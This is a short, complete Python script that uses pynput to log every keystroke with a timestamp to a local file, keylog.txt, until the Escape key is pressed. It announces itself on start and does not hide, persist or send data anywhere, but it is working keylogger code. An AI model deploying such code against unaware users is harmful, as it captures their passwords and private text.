from pynput import keyboard
import time

def on_press(key):
    try:
        char = key.char
        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {char}\n")
    except AttributeError:
     # Special keys (like space, enter, etc.) are handled here
        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [{key}]\n")
      

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener if the escape key is pressed
        return False
   
if __name__ == "__main__":
    print("Logging keys... Press ESC to stop.")
    with open("keylog.txt", "a") as log_file:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
